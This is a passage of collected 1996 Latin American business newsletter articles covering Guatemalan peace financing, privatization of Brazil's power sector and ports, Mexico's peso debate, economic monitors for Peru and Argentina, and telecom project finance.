projects priority list divided into four categories. Theseare: "emergency" projects for which international donations will besought; "integrated social development" projects that are to be fundedby a combination of national and international sources; "statemodernization" projects that will rely on government income and themultilateral agencies; and "productive development" projects that willbe essentially a matter of attracting foreign investment and negotiatingincreased access of Guatemalan products to international markets. The head of the commission,government negotiator Richard Aitkenhead, says the government is hoping that 73%of the total will be provided by the international community. Aitkenheadenvisages that approximately 17% of this will be donated, 6% will take the formof technical cooperation, and the remaining 77% will have to be paid back. PruningThe State. Strengthened by the peace agreement, the government is overcomingits initial inertia in domestic policy. A flurry of recent legislation focuseson a state modernization program. In late June vice-president Luis Florespresented a bill that contemplates a reduction of the bureaucracy anddecentralization of activities away from the central to local governments.Public sector unions vehemently oppose these moves which they fear will lead tomass dismissals, but their ability to protest is limited by recent laborlegislation reforms that restrict their right to strike. EconomicWoes. The current political confidence of the Arzu administration, bothinternationally and at home, contrasts with its rather insecure economicposition. State coffers are empty and tax collection is below expectations. Thecentral government also must cope with a $1 billion plus short term internaldebt it inherited from previous administrations. Central bank figures from thefirst few months of 1996 indicate that the economy is performing less well thisyear than last. Security Worries. Most analysts blame thedeceleration on high lending rates and falls in the price of major export crops,but the less quantifiable factor is worrying levels of organized violent crime.At the end of June, Humberto Pretti, president of the powerful private sectorgroup, ACIF, caused a storm with the revelation that over the last eight monthssome 140 businessmen have been kidnapped for ransom payments that in some casesran into millions of dollars. The government accused Pretti of irresponsiblebehavior, and insisted that the security forces are having notable successescapturing and disbanding kidnapping outfits. But there is clearly concernthat violent crime is having a serious impact on confidence, particularly in thecontext of recent warnings issued by the US state department to touristsplanning to visit Guatemala. In an effort to show that he is prepared to respondto the clamor for action, President Arzu has reiterated on several occasionsthat the controversial death penalty for kidnappers approved by congress lastyear will be applied. © Copyright 1996 Latin American Information Services, Inc.

Unemploymentis the electorate's top concern and the worry is real enough to translate into asignificant upturn in the traditionally low savings rate. Radical Fernando dela Rua is the first elected mayor of Buenos Aires. His margin of victorytrounced the Peronist incumbent, for whom President Menem had campaignedvigorously. Page 2 BRAZIL Pressing financial needs have moved privatization of theelectric power sector into the fast lane. Officials are leapfrogging thequestion of how to divide Eletrobras and putting 11 of its holdings on theblock. The Sao Paulo government is reparceling its three power companies into 20properties that will be sold. BNDES is seeking to accelerate the ports'privatization. Concern about the stability of the real is mounting. Page 3 CHILE Government officials aren't hitting the panic button inthe face of the steep fall in copper prices – yet. Thanks to cautiousbudgeting and ample reserves, the government claims it should not have to reviseits economic projections for 1996. However, it may have to revisit pesomanagement. The outlook for 1997 is highly dependent on just how deeply theSumitomo scandal damages the world copper market. Page 4 COLOMBIA New tensions have erupted between the US and Colombia,this time centered on air routes. The dispute is ostensibly unrelated to eitherthe decertification of Colombia as a drug-fighting nation or the dismay atPresident Samper's exoneration on corruption charges. But the combination ofpressures, heightened by new friction in the war on drugs, leaves little roomfor positive developments. A new liberalization of foreign investment ruleshas been announced. Banco Popular is again being readied for privatization. Page 5 CUBA The Helms-Burton Act is being taken seriously as thecenterpiece of US policy toward Cuba. Companies like Cemex are leaving Cubarather than tangle with the legislation. Moreover, since the legislation shiftscontrol over the embargo from the president to congress, Cuba experts see littlechance for the embargo being lifted until Fidel Castro leaves power. Page 6 MEXICO As it eyes a possible defeat for the ruling PRI in theJuly 1977 elections, the finance ministry has decided to go for economic growthin the 7% range over the remainder of the sexenio rather than settling for just5%, even if it means sacrificing inflation goals. The central bank appearsreconciled to this strategy. Page 7 PERU The latest electricity privatization, that of the northerngenerating system, was won by Dominion Energy, which also has holdings inArgentina and Bolivia.

On the grounds of rooting out corruption, President Fujimori'sauthoritarian streak has shown itself again, to the outrage of those who say hishigh-handed tactics are undemocratic. Page 8 VENEZUELA A behind-the-scenes political fight over the future ofCVG and the sale of its huge aluminum, steel and other holdings appears to havebeen settled with the privatization goal still intact. At issue was a reformproposal that could have had the effect of removing the Venezuelan InvestmentFund (FIV) from managing the asset sales, thus potentially undoing the years ofwork FIV has already put into the process. Page 9 PENSION REPORT/BRAZIL An examination of some of the issuesinvolved in changing the relationship between the central government and thepension funds run by state companies reveals just how confounding the problem ofpension reform is. The state funds, handsomely funded from the federal purse,are not only an emergency source of mega money for the latter, but a major buyerof state assets as well.

VOL. 13, NO. 14 ISSN 1040-3175 Brazil BNDES, Sao Paulo State Ready to PushSale Of Electrical Holdings Economic imperatives have prompteda dramatic thrust in the privatization of the energy sector, both on the federaland the state level. In a move that will greatly accelerate the sell-off ofindividual Eletrobras power plants, the government has dispensed with the planto delay privatization until formal studies of how to divide the company's fourregional subsidiaries are complete. In Sao Paulo, the state assembly has decidedto regroup the state's three power companies into 20 different properties, mostof which will then be sold. Eletrobras Plants For Sale. Inmoving ahead to sell off the Eletrobras plants, the National Bank for Economicand Social Development (BNDES) is bypassing for now the thornier issue of how toparcel out the subsidiaries, which are Eletronorte, Eletrosul, Chesf and Furnas.The 11 plants tapped for sale are comprised of five Chesf concessions, oneFurnas concession, two Eletrosul concessions, and three Eletronorte concessions. Several thermoelectric plants were also included in the new BNDES plan,including Eletronorte's isolated Amazon operations, which use subsidized oilunder a special scheme. The government estimates that the running costs of theseplants will be halved once they are sold by eliminating the restraints ofbureaucratic red tape, overemployment and the diversion of subsidized oil fromthe market by municipalities and corrupt officials. The plan also includes the217 MW Samuel hydroelectric plant in the Amazon, which needs $67 million to befinished. The plan is one of 18 offered last year by Eletrobras to privateconsortiums for completion. Valuable Assets. The move in SaoPaulo will also help propel the federal program, given the state utilities' keyposition in the national power grid. The three state companies, located in thesouth-southeast-center west grid, are Centrais Eletricas de Sao Paulo (CESP)with nearly $2.2 billion sales a year, Eletropaulo with $2.6 billion andCompanhia Paulista de Forca e Luz (CPFL) with just over $800 million yearlysales. The state gas company Comgas is also included in the package. Together,the companies account for about 40% of Brazil's energy take. The threeutilities have assets of $19 billion, but they carry a debt burden of $12billion. Selling the companies is expected to bring in about $5 billion to thestate treasury. The properties will be split into units according to the natureof their operations. These units will then be regrouped into six generatingcompanies, 13 distribution companies and one unified transmission company. Thetransmission company will remain under state control and administer the mainlines used by the various private generating and distribution companies, forwhich it will charge a tariff. State Maintains A Role. A newstate holding company will be created with the chief task of managing the SaoPaulo state privatization program. In addition to the power utilities, more than50 state companies, including significant real estate assets, were listed forsale. Under the plan passed by the state assembly, this holding will retaingolden shares of each privatized power utility, to guarantee the government'ssay in energy planning decisions. Sao Paulo governor Mario Covas is thearchitect behind the plan, which is far more elaborately detailed and sociallyconcerned than the vague and contradictory proposals aired so far by BNDES andother federal authorities for the national utilities. The plan calls for theprivatization of CESP to start with distribution, which is less dependent onthe state bureaucracy since its market is the general population. By cuttingCESP down to size, the state hopes to allay the fears of potential biddersregarding the dictates of a giant state company in determining long-term supplycontracts, spot market prices and transmission tariffs. GeographicBalance. The current distribution network will be split into separatecompanies so that each one comprises high- and low-income regions. CESP'sgenerating assets are to be divided into five companies, according to the fivemajor river basins of the CESP system, to permit coordinated management of eachriver basin's water resources. Eletropaulo, the largest Brazilianelectric utility in terms of sales, is almost exclusively an electricitydistributor. It will be split into eight independent companies, six of whichwill be distributors, one that will concentrate the company's generatingcapacity and another that will deal with transmission. CPFL serves mostly theinterior, including some very large energy consumers. BNDES Takes OverPort Privatization Frustrated by the lack of progress in the ports privatization program, BNDEShas taken over the plan from the transport ministry. The BNDES then listed 31ports for sale, including the key ports of Vitoria, Rio de Janeiro and thesweeping complex at the port of Santos. Incentive Plan. Theimpact of the move is hard to predict. While the privatization plan has beenproceeding under the careful study of the transport ministry, BNDES is offeringto boost the program with a special line of credit. The credit would apply towinning concessionaires on the condition that all the money is invested toupgrade and expand the ports. © Copyright 1996 Latin American Information Services, Inc.

VOL. 13, NO. 13 ISSN 1040-3175 Brazil Government Designs Incentive PackageTo Switch on Growth In the face of his party's fragile standing forupcoming municipal elections, President Fernando Henrique Cardoso has orderedhis economic team to work out a package to stimulate economic growth, largely byboosting exports. The goal is to achieve a 6% annualized GDP growth rate by theend of the year. This would require an immediate and significant reversal ineconomic trends. GDP shrank by an estimated 2% during the first quarter,compounded by a particularly dramatic 10.4% drop in manufacturing output. JobsProgram Too. Economic incentives will also tackle the thorny issue ofunemployment, which opinion polls indicate has become a major concern withvoters. While most continue to support the president personally, disenchantmentwith his administration is spreading. The cost of living is on the rise, andvoters are still demanding an explanation for the $8 billion spent to shore upbankrupt financial institutions during a period of declining socialexpenditures. This growing climate of discontent helped unify rival unions intocalling a general strike this week to protest government economic policies. PushFor Exports. In designing a plan for aggressive growth without making itselfvulnerable to an even larger foreign trade deficit, the government isemphasizing exports. Brazil has lately seen some progress in managing its tradedeficit. After last year's $3.17 billion shortfall, exports through May of thisyear climbed 10% to $19.09 billion, matching the rate of import growth for thesame period. But seasonally adjusted figures point to a $1.8 billion deficit byyear-end. The export incentive plan includes the following measures: Anew $1 billion export credit line from the National Bank for Economic andSocial Development (BNDES). The credit line will be offered to industries withthe largest export growth potential and most damaged by the real's unfavorableexchange rate. These sectors include car parts, textiles, apparel, footwear,furniture and semi-precious jewels. Loans will be granted for 15 months andcarry an estimated 11.5% p.a. interest rate, about a third of Brazilian bankrates. The loans will cover up to 85% of each company's exports with a limit of$10 million per company. Creation of special insurance coveragefor export credit risk, including political risk. This is an old request bycapital goods producers and building contractors that were burned in large scaleprojects in Iraq and Angola. The system will be introduced by means of apresidential emergency decree and implemented by Banco do Brasil, the BNDES anda private operator yet to be named. It will have treasury backing to cover thepolitical risk coverage of the insurance. Deregulation of foreign trade toreduce embarkation costs. The transport ministry claims that it is possible toeliminate 11 of the 18 taxes charged on exports at Brazilian ports and hasalready done so on an experimental basis at the port of Para. The extension ofthe simplified system is being negotiated with the different port authoritiesacross the country. Exemption from the value added tax (ICMS) andthe IPI industrial products tax on exports. This is the most complicated part ofthe package, requiring detailed negotiations since the ICMS is the main sourceof revenue for the states. The government's tax reform bill merges the ICMS andthe IPI into a single federal tax and eliminates taxation on exports, on basicfood basket items and on materials used in agriculture. Considering theurgent need to boost exports and a slow-to-act congress, the government is nowconsidering delaying debate of the bulk of the bill until next year andeliminating export taxes via presidential decree. Meanwhile studies by a workinggroup of federal and state officials concluded that eliminating the ICMS taxwould amount to a loss of about $1.3 billion a year for state coffers. Stateswould be fully compensated during the first three years in the form of a creditto be used by them to pay their federal obligations. Compensation would then begradually phased out over six years. Privatization Troubles HitBNDES' Landau The battered privatization process has absorbedanother blow with the resignation of Elena Landau as privatization director atBNDES. Last month BNDES found itself jumping from auctioneer to buyer during thetroubled sell-off of Light, which failed to attract an investor willing topurchase the full minimum 50% stake (LL 5/24/96). The sale of the Center-Eastsection of the Federal Railway System nearly turned into a fiasco after the twobidding groups joined forces to make the minimum bid, with state-owned CVRDleading the consortium. Landau was considered by some observers as too naive todeal with the foxes and wolves of a typical privatization. She was pushed asideby Luis Carlos Mendonca de Barros, the new BNDES chairman who hails from thebanking sector. New Model Ahead? The entire privatization modelis now being informally debated as some very large properties and the powersector make their way through the pipeline. Some observers claim that unless thegovernment speeds up the studies necessary to introduce clearer rules andguarantees for tariff readjustments in public services, the privatization of thelarge state companies may face the same problem that harmed the Lightprivatization. One suggestion is to split the big companies into smaller unitsto reduce the risks for bidders and the costs of each auction. © Copyright 1996 Latin American Information Services, Inc.

VOL. 13, NO. 9 ISSN 1040-3175 Mexico May 10, 1996 To Devalue or Not? Sides Line Up To Reopen Debate A new exchange rate debate is starting in Mexico, one thatunderlines the different philosophies of the finance ministry and central bankwith regard to peso manage ment. So far, the only measurable effect has been aslight weakening of the peso. The public discussion was kicked off by Gilberto MarinQuintero, chairman of the National Board of Foreign Trade (Conacex), who notedat a press conference that although inflation in the first quarter of the yearwas more than 10%, the peso had actually strengthened 3% against the dollar. Heargued for gradual slippage to prevent the need for a drastic devaluation in thenear future. His voice was joined by those of other exporters including VicenteFox, governor of the state of Guan ajuato and member of a family that hastraditionally exported shoes and vegetables. Fox called on the govern ment to "putsome money" into a program designed to forestall overvaluation. Exportersargue that if the peso continues to gain ground against the dollar, foreignsales will collapse rapidly and put the country back into the kind of serioustrade imbalance it had in 1994. Exports are growing at a healthy annual clip of 27%. Butimports are no longer declining and have begun to increase. If they grow toomuch, especially if encour aged by cheap dollars, the trade surplus could easilydisappear and put Mexico back in the red by 1997. The Finance Ministry Line. The national developmentplan, gospel for both President Ernesto Zedillo and the finance secretariat,favors a slight undervalued currency to promote exports. However, officialsclaim that the time for adjustment has not yet come, though they decline to goon record as to the present degree of undervaluation. Estimates range from10-15%. Central Bank Differs. The independent central banktakes a different view, arguing in favor of flotation. The rationale is thattrying to keep a currency undervalued against market forces will only propelinflation and will not help exports in the long-term. The argument is reallyacademic at this point, but the difference could be important for future policymaking. Foreign exchange reserves are at a relatively low $15 billion and couldnot support any sustained intervention in the exchange market. Thus, the currentmildly managed float is really the only available option. Future Clash? But this could change. If the financesecretariat were to insist on an undervalued peso that threatened an upsurge ininflation, Bank of Mexico would counter with higher interest rates. This wouldboth put a damper on domestic growth and attract foreign portfolio money,starting the vicious cycle all over again. One observer equates such a situationto the finance secretariat having a foot on the gas pedal while the Bank ofMexico slams on the brakes. Market Reaction. All this talking did move thecurrency – a little bit. After almost two quarters of stability, the dollarwas trading at P7.42:$1 in the wholesale market at mid-April. By May 8, the ratehad weakened to P7.50:$1. A Bank of Mexico official conceded that the demands ofexporters did have something to do with this move, but discounts it asnegligible. "They were surely counting on a much steeper devaluation,"he said. "I'd say their effort was a failure." Interest rates havebeen declining rapidly all along. On April 9, 28-day Cetes were yielding 37.43%p.a. One month later the yield was down to 30.6%. Production Finally Up Amid Positive Signs Recovery is starting to take hold. Industrial productiongrew 4.1% in February, compared with the same month in 1995. This is the firstmonthly increase in the IPI since January of last year; the index reached itslowest point in April 1995, when it fell 13.9%. Mining was the most dynamic sector, registering an 8%increase in output. Manufacturing rose 5.4%. Construction remains depressed,with a 2.8% decline in February. Large publicly traded Mexican companies saw a 4.8% declinein real sales during the first quarter. This is a huge improvement over the20-30% drops seen in the second quarter 1995. Sales by manufacturing companies,buoyed by exports, rose 5%. Service companies, how ever, remain stuck inrecession. Companies are begin ning to show profits, as cost cutting and debtreduction have helped boost bottom lines. One of the most robust profit pictures was that released byPemex – the first time the oil monopoly has made its results public. Itssales for the first quarter totaled $9 billion. Operating profits were up 60% inpesos, to P30.3 billion, and 27% in dollars, to $4 billion. BRADY REPLACEMENT SUCCEEDS Mexico issued $1.75 billion in new sovereign debt on May 1,enabling the government to retire $2.5 billion in Brady bonds at a discount. Theissue, which had been in the works for months, is considered a coup even thoughit did not raise the $3 billion originally sought. Mexico is paying 552 basispoints over US Treasury bonds for the issue. It is a high price, but notunreasonable considering the fact that the bonds have no collateral, unlikeBradys' US Treasury guarantee, and that the country is still recovering from aworld- shaking economic crisis. © Copyright 1996 Latin American Information Services, Inc.

VOL. 13, NO. 4 ISSN 1040-3175 Mexico Financial Outlook Inflation edged up in September after a steady decline since January.Year-end inflation will likely total about 25%, slightly above the government'spredictions of 22.5%. Interest rates continue falling as economic expectations improve.One-month treasury bills (Cetes) dropped below 23% in early October. The trade surplus is still growing, though not as fast as last year. TheJanuary-August surplus grew only 6.2% over the same period in 1995. The year-endsurplus should still run about $7 billion, but imports are growing faster thanexports for the first time since the December 1994 devaluation and 1997 willlikely see the return to a negative balance as the economy continues to pick upsteam. The current account showed a surplus during first-half 1996, compared toa deficit last year and the year-end balance may be slightly positive. Nextyear, however, a deficit of 1% to 2% of GDP is expected. Reserves remain stable, and capital flight has stopped. But net reservestotaled only $3.7 billion on September 30. The Bank of Mexico is buying dollarson the open market to build up the reserve pool. The exchange rate strengthened from January through September. But strongpressures in early October pushed the peso down to P7.85:$1. This relieved someof the anxiety that had been building in recent weeks over whether the peso wasbecoming too strong. Economy Monitor Growth Outlook: GDP is expected to grow 4% by year-end, toppingthe government's 3% estimate. Higher-than-expected 7.2% growth in the secondquarter helped push the figure up. The finance minister is now forecasting 6%growth for 1997, well above the 4% figure he was predicting just a few weeksago. Political Factors: Electoral reform measures approved by allpolitical parties have boosted international confidence about the Zedillogovernment's commitment to strengthening democracy. But many economists areconcerned that uncertainty surrounding the 1997 federal elections will depressthe exchange market in early and mid-1997 and may hamper growth. Fiscal Situation: The government still expects a balanced budgetfor 1996. But officials have quietly accepted a 1997 deficit of 1%-2% of GDP.They blame the expected shortfall on the new private pension scheme, which willdraw monies away from the federal system. Key Sectors: All sectors grew during second-quarter 1996 comparedto second-quarter 1995, when activity plummeted following the December 1994 pesodevaluation. Driving the 1996 spurt were transportation (14.3%) andmanufacturing (13.9%). Financial services rose 2.1%. Industrial production rose 8.7% in January-July 1996 compared to1995. Mining and manufacturing led, but paper, printing and publishing werestill below 1995 levels. Steel production grew 10.9% in first-half 1996, boostedby new plants belonging to AHMSA, Hylsa, Imexsa and Tamsa.Beer production rose 5.4% in the first semester, with the domestic marketrepresenting 3.5%. Employment: Open unemployment fell to 5.3% in August 1996 afterpeaking at 7.6% a year earlier. Mining and manufacturing generated the most jobgrowth, registering respective increases of 9.8% and 9.1% from July 1995 to July1996. Stock Market: The bolsa rose 16% from end-1995 to close the thirdquarter at 3,236.32 points. The increase represented an 18% rise in dollarterms, which still fell short of 20% accumulated inflation. Company Monitor Nineteen companies have announced intentions to launch pension funds(Afores) next year under rules established in 1995. Participants includeUS-based Aetna with Banamex; Citibank and BancaSerfin; Spain's Banco Santander with Inverlat; Germany'sDresdner Bank with Bancrecer; and Banker's Trust withBanorte. Privatization of Pemex's petrochemical plants was canceled onOctober 14. According to new rules, private investors will be able to buy only49% of the companies. The privatization will be held on the stock market, notthrough direct sales. The first railway privatization failed. Though several groups showedinitial interest in the Chihuahua-Pacific line, only one came through. This wasGrupo Mexico mining company, which offered $27.7 million, well under thegovernment's $50 million minimum price. Other lines will still be offered toprivate bidders. The Chihuahua-Pacific line may be included in another package. Four companies have received permits to operate direct-to-home (DTH)television. Three were ready to operate by third-quarter 1996, including Sky(a joint venture of Televisa with Brazil's Globo and US-basedNews Corp.), Multivision and Telered. But the launchawaits signing of a satellite protocol between Mexico and the US. State oil monopoly Pemex is having a good year. Crude productionaverages 2.8 million bpd, up from 2.6 million in 1995.

VOL. 13, NO. 3 ISSN 1040-3175 July 31, 1996 PERU Financial Monitor The 1996 inflation target agreed upon in the IMF accord ranges from 9.5%to 11.5%, a goal likely to be met. Accumulated inflation for the first sixmonths totaled 6.38%, with June's 0.47% consumer price rise the lowest of theyear. Interest rates and banking spreads remain high. Large companies can borrowdirectly abroad for 9%-10% p.a., but medium-sized businesses pay around 18% forlocal dollar-denominated loans. Banks are moving for the first time into thehome mortgage market, offering 15-year loans ranging from 13.5% to 14.5%. The trade balance is improving. The deficit was $507 million throughApril, or $202 million less than last year's four-month figure. Exports rose 12%over January-April 1995, while imports stagnated. Public spending cuts and othercooling measures have already helped shrink the current account deficit from7.2% of GDP in 1995 to 5% in first quarter 1996. The economy ministry predictsit will hover around 5.7% for the year. Net international reserves topped $7 billion in mid-June. Privatizationrevenue, estimated by the finance ministry to amount to an additional $6 billionby end 1998, will keep the figure high. The sol devalued very slightly against the dollar in the first half of theyear. Government officials continue to predict a 3% devaluation in real termsfor this year. But the central bank continues to intervene to mop up the excessdollars from high foreign investment. Economy Monitor Growth Outlook: The economy has cooled down fast. Even with MayGDP 2.2% up over the same month in 1995, global output expanded by just 0.7% inthe first five months. But the outlook for the second half is brighter, withofficial year-end growth estimates ranging from 3.5%-4.5%. Political Factors: After a major cabinet reshuffle in early April,the Fujimori government is settling into a new rhythm marked by greater internalcohesion. Steadfastly ignoring still-ragged attempts at popular opposition, thegovernment has managed to get the controversial privatization of state oilproducer Petroperu under way. Despite a better economic outlook for the secondhalf of 1996, Fujimori will be hard pressed to meet popular expectations of jobcreation and improved living standards. Fiscal Situation: Protracted negotiations with the IMF over asecond consecutive three-year extended fund facility finally concluded with theIMF's July 1 approval of Peru's letter of intent. The government has committedto achieving a gradually increasing primary surplus, which will rise from 1995's0.3% to 2% of GDP in 1998. Central government income is scheduled to rise from14.1% of GDP in 1996 to 14.6% in 1998, mainly through more efficient taxcollections and continual adjustments to gasoline prices. Major Sectors: After the late lifting of the fishing ban, activityin the fishmeal industry picked up, and five-month output rose 10.9% over thesame period last year. The construction sector remains relatively depressed dueto public spending cutbacks. Output rose in the mining sector by just 1% in thefirst five months. Copper output was 17.5% higher during the same period,largely thanks to Southern Peru's new Toquepala plant, expected to produce atleast 40,000 metric tons of 99.99% pure copper cathode this year and raiseproduction 9%. Still, the dramatic plunge in international copper pricesfollowing the Sumitomo trading scandal will almost certainly push exportearnings down. Gold production rose 13.7%, with US-Peruvian joint ventureYanacocha responsible for the lion's share: it produce 9.43 metric tons, or 48%more than the same period last year. Oil production continues to decline, withMay output down to 3.7 million barrels, 5.7% lower than the same month in 1995.But the government has signed several new exploration contracts. In May, thegovernment finally signed a contract with a Shell/Mobil consortium for development of the huge Camisea fields, which contain the equivalent of 2.1 billionbarrels of oil equivalent. Stock Market: The general shares index rose barely 10% at the endof the first half, while the blue chip index rose 13%. Expectations for asuccessful international placement of Telefonica del Peru, already the Limastock exchange's most heavily traded share, drove the rises. Company Monitor A consortium headed by Repsol of Spain and including Argentina'sYPF and Mobil of the US acquired 60% of the La Pampillarefinery, Peru's largest, for $180.5 million. Pluspetrol of Argentinawon the concession for jungle blocks 8-8x with a bid of $142.2 million. The June11 auctions marked the delayed start of privatization of state oil company Petroperu. Dominion Energy of the US won the northern generating system knownas Egenor in June. Dominion bid $228.5 million for a 60% stake in the408 MW facility, narrowly defeating a rival bid from Destec Energy, alsoof the US. The Telefonica del Peru share offering, a second stageprivatization of the state's retained holding, succeeded domestically andinternationally. Some 230,000 Peruvians became shareholders, most for the firsttime, through the incentive-based "citizen participation" scheme.Offers from international institutional investors were five times greater thanthe number of shares available. The total amount placed was $1.1 billion, LatinAmerica's biggest equity offering since 1993. Southern Peru, majority-owned by US-based Asarco, willfinally have completed an investment program amounting to $445 million sincelate 1991. It includes $103 million spent on a sulfuric acid plant for its Ilosmelter, another $100 million on a solvent extraction-electrowinning plant atits Toquepala mine, more than $100 million on new mining equipment and asubstantial amount on environmental improvements. Southern is contemplatinglarger investments still, to raise output by some 70% to more than 500,000 tonsof refined copper. © Copyright 1996 Latin American Information Services, Inc.

VOL. 13, NO. 9 ISSN 1040-3175 Argentina April 1996 Financial Outlook Inflation was only 0.3% for the 12-month period ending in February. Theconstruction index indicates a price decline of 0.3%, while the WPI rose 4%. Thegovernment predicts 1.5% inflation for 1996. Price stability should continue,despite rising food prices. Interest rates are going down more slowly than the government would like.The VAT on bank loans and interest has been reduced in order to spur thedescent. Exports are expected to show a 12% increase this year, after having soared32% last year. Sales to principal trading partner Brazil are forecast to rise15%. Imports will increase more slowly, depending on when the economic upturnbegins. Current predictions are for imports to reach $21.1 billion, resulting ina trade surplus of $2.2 billion. Bank deposits – including dollar deposits – grew 9.1% duringJanuary and February to $46.7 billion, surpassing the $43.8 billion registeredat the end of 1994. (The end 1994 figure was calculated after the Mexican crisisbegan; it does not reflect the $6.2 billion that left the country duringfirst-quarter 1995.) Time deposits in pesos jumped 23.5% in first-quarter 1996and dollar deposits rose 8.7%. Loans grew far more slowly: 11.3% in pesos andbarely 1.7% in dollars. Bank liquidity has surged, as bankers hold potentialborrowers to higher credit standards in an effort to avoid increasing thesector's bad loan portfolio, which jumped 64.8% during the first eight months of1995. The excess funds are invested abroad or in bonds. The unwillingness ofbanks to lend is reinforcing the recession. Convertibility is being strictly maintained. Gold and forex reservesexceed the monetary base by 30.8%. In February, the government reached anagreement with the IMF for $1.1 billion in standby funds that will be disbursedquarterly over 21 months. Economy Monitor: Argentina Growth Outlook: GDP defied all earlier forecasts and shrank 4.4%during 1995. Economy minister Domingo Cavallo is sticking to his 5% growthprediction for 1996, but local private forecasts are running as low as 1.5%. Theforecasts vary so widely because the economy still shows few signs of havingclimbed out of recession. The one sign of incipient recovery is lower carinventories. Political Factors: The economy ministry's second in command, JuanLlach, has publicly blamed 70% of the recession on the friction betweenPresident Carlos Menem and economy minister Cavallo. Hostilities appear to haveabated. After much discussion, congress has approved the importantadministrative reform measures to shrink the size of the federal government bymerging and eliminating various agencies, but it remains to be seen whether newcabinet chief Jorge Rodriguez will show the same enthusiasm for such reform ashis predecessor, Eduardo Bauza. Fiscal Situation: Despite the VAT hike from 18% to 21%, therecession continued to push down tax revenues, which then pushed the fiscaldeficit up to 1.7% of GDP last year. The 1996 deficit could be 1% of GDP unlessthe economy begins a strong recovery. Major Sectors: Agrochemicals grew 27.8% in January and February,compared to the same period in 1995. Food products grew 5.7%, cigarettes 1.1%and aluminum production 0.7%. But manufacturing fell 10.5%, according toeconomic think tank Fiel (5% according to official statistics agency INDEC), asconsumers stopped buying for fear of losing their jobs. Six industries declinedmore than the Fiel average: auto manufacturing (40%), petrochemicals (29.1%),cement (26.6%), freezers and washing machines (25.7%), tractors (22.3%) andtires (20.3%). Despite a drought that lowered crop yields 6%, farmers' income willincrease 37% this year due to large price increases for wheat (81%, also thesowing area will increase 25%), corn (79.3%), soybeans (28.7%) and sunflowers(13.1%). But farming comprises only 6% of GDP, so the effect will be minor.Sales of farm machinery, seeds, fertilizers and agrochemicals are expected toincrease steeply; already, sprinkler sales in January and February matchedannual sales for 1995. Beef exports are improving and revenues may reach $1billion. Unemployment: The jobless rate went down to 16.2% in the officialOctober poll after having shot up to an unprecedented 18.6% in May 1995. But thereduction was due more to disappointed jobseekers abandoning their search ratherthan to the 40,000 new jobs created since the May survey. The governmentpredicts that unemployment will fall again in the May 1996 survey, but privateanalysts are dubious. Stock Market: Both stocks and bonds dipped in mid-February whenhostilities reignited between President Menem and economy minister Cavallo, butlater recovered as the two made up again. Though the blue-chip index has sunk2.9% since the beginning of the year, it has registered a 42.9% hike over thepast 12 months, when tequila effect fallout first pushed it down. Company Monitor Rhodia-star is deciding whether to build a second 90,000-tonplant following Eastman Chemical's decision to produce 130,000 tons ofPET. Investment would be $70 million. YPF and Shell areconsidering a joint venture for a PET plant targeted mainly for exports. Chile's Embotelladora Polar paid $19.8 million for a Coca Colapermit in Patagonia, and also bought licenses from four Coca Cola companies inBahia Blanca, Chacabuca (Buenos Aires province), Neuquen and La Pampa. Totalcost was approximately $55 million. Spain's Iberia sold 60% of its equity in Aerolineas Argentinasto Merrill Lynch and Bankers Trust as well as its entire stakein Argentine regional airline Austral and in Chile's Ladeco,though the Spanish company will continue operating all three airlines. The saleprice for all three companies was estimated at $280 million. The two new ownersplan to seek potential buyers. Nabisco affiliate Terrabusi bought baked-goods companyMayco Capri for $35 million. Mayco's annual sales are $30 million. © Copyright 1996 Latin American Information Services, Inc. All RightsReserved.

VOL. 5, NO. 9 ISSN 1084-5526 Finance Int'l LendersRemain Wary of LA Telecom Projects Lack of familiarity with technology and the risk factors associated withtelecommunications projects is dampen ing international financiers' interest inLatin American telecommunications infrastructure deals, said speakers atAmericas Telecom '96, a November conference in San Francisco sponsored by theInstitute of the Americas. "Telecom financial deals have been scarce," said Rich Damiano,project finance director for Lucent Technologies, the former AT&T Bell Laboratories recently spun off as a separate company. "We keeptrying [to do deals], but we're not getting there yet." Damiano said theproblem is that, given the competition for capital, financial institutions tendto concentrate on what they are "more comfortable with," namely,power, pipelines and energy. "We need to educate investors so they canproperly assess telecommunications risk," Damiano said. For example,helping investors understand the differences between TDMA and CDMA (twocompeting technologies used in cellular telephony) can go a long way tomobilizing capital for cellular projects, one of the fastest-growing areas inLatin American telecommunications. Big Investments Needed During the next five to seven years, investment requirements in telecom areprojected to be $100 billion. The Brazilian government will soon begin toauction off licenses for Band B cellular communications (P&F 11/96),and capital requirements for licenses alone are estimated to run between $3billion and $5 billion for the entire country. A license in densely populatedSao Paulo may require $1 billion or more, Damiano said. Ready To Help Steve Howlett, senior business development officer for US Eximbank,and Walter Jones, Latin America regional manager for the Overseas PrivateInvestment Corp. (OPIC) said that both of their government-backedinstitutions are ready and willing to finance telecom deals in Latin America. But Howlett acknowledged that telecom projects make up only a small percentageof Eximbank's total participation in Latin projects, though the regionconstitutes 40% of the bank's worldwide exposure. He added that Eximbank iswilling to undertake very small telecom transactions, pointing to a $41,000 dealin Argentina last year. Who Is The Customer? But international lenders still perceive risks in the field. In cellularservices, for example, there is no guaranteed subscriber base. By contrast,investors in power deals are confident that most people will want electricity intheir homes. The "take or pay" financing structure (by whichpurchasers agree in advance to pay for a certain amount of power) common in thepower sector is not going to be obtainable in telecom, Damiano said. So where can telecom projects turn? Damiano said they will have to rely onmultiple sources of financing. Only established, government-owned telecomcompanies in the region can count on capital markets, either through IPOs orsome form of asset securitization. New and growing entities must rely onsponsors' equity, subordinated debt and maybe local bank debt, which varies fromcountry to country. Banks in Argentina, for example, may parcel out five- toseven-year loans, "but we're not seeing this in Brazil," Damiano said. Even established companies cannot always rely on 144A and Eurobond marketsfor new money: post-devaluation Mexico proved that capital markets will stillflee at the first signs of crisis. Damiano pointed to several US and international agencies as potentialfinancing sources for telecom projects. OPIC "understands cellular as wellas anyone" and "offers instant credibility to a project," hesaid. Eximbank also offers attractive rates, but deals must have US sponsors tobe eligible for the bank's programs. Besides the International Finance Corp.and the Inter-American Investment Corp., Damiano called on the WorldBank's Multilateral Investment Guarantee Agency (MIGA) to get moreinvolved in political and economic risk insurance. Commercial banks are anothersource, but they still want full-recourse financing for telecom projects, hesaid. § CABEI Increases Funds For Private Projects The Central American Bank for Economic Integra tion (CABEI) plans toboost private-sector lending from 25% to 40% of its loan portfolio, emphasizinginfrastructure projects and small and medium exporters. The Tegucigalpa-basedbank expects to approve some $500 million in loans with half going to theprivate sector, said chief financial officer Jaime Chavez- Almendares. During FY1995-96, which ended June 30, CABEI approved $442 million, with $294 milliontargeted to private-sector firms. The net loan portfolio for the fiscal yeartotaled 